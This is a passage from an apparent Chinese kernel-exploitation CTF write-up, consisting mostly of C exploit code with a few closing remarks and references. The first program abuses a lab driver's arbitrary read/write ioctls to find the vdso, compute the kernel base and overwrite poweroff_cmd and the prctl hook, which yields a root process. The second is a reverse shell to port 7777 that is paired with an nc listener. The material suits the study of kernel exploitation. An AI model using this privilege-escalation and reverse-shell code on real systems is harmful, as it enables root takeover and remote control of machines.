#include #include #include #include #include #include #include #include #include #include #include #include #include #include #include #include //poweroff字符串的偏移
#define POWEROFF_CMD 0xe39c40
//orderly_poweroff函数的偏移
#define ORDERLY_POWEROFF 0x070060
//prctl_hook的偏移
#define PRCTL_HOOK 0xe7c7d8;
 
 
struct arbWriteNote
{
    ssize_t addr;
    ssize_t len;
    char* data;
};
struct arbWriteNote arbWriteObj;
 
 
//open dev
int openDev(char* pos);
int get_gettimeofday_str_offset();
 
int main(int argc, char *argv[])
{
    setvbuf(stdin,0,2,0);
    setvbuf(stdout,0,2,0);
    setvbuf(stderr,0,2,0);
 
    int devFD;
 
    //open Dev
    char* pos = "/dev/arbWriteModule";
    devFD = openDev(pos);
 
 
    // //set comm[TASK_COMM_LEN]
    // char target[16];
    // strcpy(target,"tryToFindPIG007");
    // prctl(PR_SET_NAME,target);
 
 
   char *buf = (char *)calloc(1,0x1000);
 
 
   int gettimeofday_str_offset = get_gettimeofday_str_offset();
   printf("gettimeofday str in vdso.so offset=0x%x\n",gettimeofday_str_offset);
   size_t vdso_addr = -1;
   for (size_t addr=0xffffffff80000000;addr < 0xffffffffffffefff;addr += 0x1000) {
      //读取一页数据
      arbitrary_read(devFD,0x1000,buf,addr);
      //如果在对应的偏移处，正好是这个字符串，那么我们就能确定当前就是vdso的地址
      //之所以能确定，是因为我们每次读取了0x1000字节数据，也就是1页，而vdso的映射也只是1页
      if (!strcmp(buf+gettimeofday_str_offset,"gettimeofday")) {
         printf("[+]find vdso.so!!\n");
         vdso_addr = addr;
         printf("[+]vdso in kernel addr=0x%lx\n",vdso_addr);
         break;
      }
   }
   if (vdso_addr == -1) {
      printf("[-]can't find vdso.so!!\n");
   }
 
    //计算出kernel基地址
    size_t kernel_base = vdso_addr & 0xffffffffff000000;
    printf("[+]kernel_base=0x%lx\n",kernel_base);
    size_t poweroff_cmd_addr = kernel_base + POWEROFF_CMD;
    printf("[+]poweroff_cmd_addr=0x%lx\n",poweroff_cmd_addr);
    size_t orderly_poweroff_addr = kernel_base + ORDERLY_POWEROFF;
    printf("[+]orderly_poweroff_addr=0x%lx\n",orderly_poweroff_addr);
    size_t prctl_hook_addr = kernel_base + PRCTL_HOOK;
    printf("[+]prctl_hook_addr=0x%lx\n",prctl_hook_addr);
    //反弹shell，执行的二进制文件，由call_usermodehelper来执行，自带root
    char reverse_command[] = "/reverse_shell";
    //修改poweroff_cmd_addr处的字符串为我们需要执行的二进制文件的路径
    arbitrary_write(devFD,strlen(reverse_command),reverse_command,poweroff_cmd_addr);
    //hijack prctl，使得task_prctl指向orderly_poweroff函数
    arbitrary_write(devFD,0x8,&orderly_poweroff_addr,prctl_hook_addr);
    if (fork() == 0) { //fork一个子进程，来触发shell的反弹
        prctl(0,0);
        exit(-1);
    } else {
        printf("[+]open a shell\n");
        system("nc -lvnp 7777");
    }
 
   return 0;
}
 
 
int openDev(char* pos){
    int devFD;
    printf("[+] Open %s...\n",pos);
    if ((devFD = open(pos, O_RDWR)) < 0) {
        printf("    Can't open device file: %s\n",pos);
        exit(1);
    }
    return devFD;
}
 
 
//获取vdso里的字符串"gettimeofday"相对vdso.so的偏移
int get_gettimeofday_str_offset() {
   //获取当前程序的vdso.so加载地址0x7ffxxxxxxxx
   size_t vdso_addr = getauxval(AT_SYSINFO_EHDR);
   char* name = "gettimeofday";
   if (!vdso_addr) {
      printf("[-]error get name's offset\n");
   }
   //仅需要搜索1页大小即可，因为vdso映射就一页0x1000
   size_t name_addr = memmem(vdso_addr, 0x1000, name, strlen(name));
   if (name_addr < 0) {
      printf("[-]error get name's offset\n");
   }
   return name_addr - vdso_addr;
}
 
void arbitrary_read(int devFD,int len,char *buf,size_t addr)
{
    arbWriteObj.len = len;
    arbWriteObj.data = buf;
    arbWriteObj.addr = addr;
    ioctl(devFD,111,&arbWriteObj);
}
 
void arbitrary_write(int devFD,int len,char *buf,size_t addr)
{
    arbWriteObj.len = len;
    arbWriteObj.data = buf;
    arbWriteObj.addr = addr;
    ioctl(devFD,222,&arbWriteObj);
} 
```

#### 反弹 Shell

```
#include #include #include #include #include #include #include #include #include int main(int argc,char *argv[])
{
    //system("chmod 777 /flag");
 
 
    int sockfd,numbytes;
    char buf[BUFSIZ];
    struct sockaddr_in their_addr;
    printf("break!");
    while((sockfd = socket(AF_INET,SOCK_STREAM,0)) == -1);
    printf("We get the sockfd~\n");
    their_addr.sin_family = AF_INET;
    their_addr.sin_port = htons(7777);
    their_addr.sin_addr.s_addr=inet_addr("127.0.0.1");
    bzero(&(their_addr.sin_zero), 8);
 
    while(connect(sockfd,(struct sockaddr*)&their_addr,sizeof(struct sockaddr)) == -1);
    dup2(sockfd,0);
    dup2(sockfd,1);
    dup2(sockfd,2);
    system("/bin/sh");
 
    return 0;
 
} 
```

或者直接`system("chmod 777 /flag");`也是获取 flag 的一种方式。

 

▲vdso 的劫持一直没有复现成功过，明明已经劫持 gettimeofday 函数的内容为 shellcode，然后也挂载了循环调用 gettimeofday 的程序，但是就是运行不了 shellcode。

 

参考：

 

[Kernel Pwn 学习之路 - 番外 - 安全客，安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/204319#h3-12)

 

https://www.jianshu.com/p/07994f8b2bb0

 

https://blog.csdn.net/seaaseesa/article/details/104695399

[[注意] 欢迎加入看雪团队！base 上海，招聘安全工程师、逆向工程师多个坑位等你投递！](https://bbs.pediy.com/thread-267474.htm)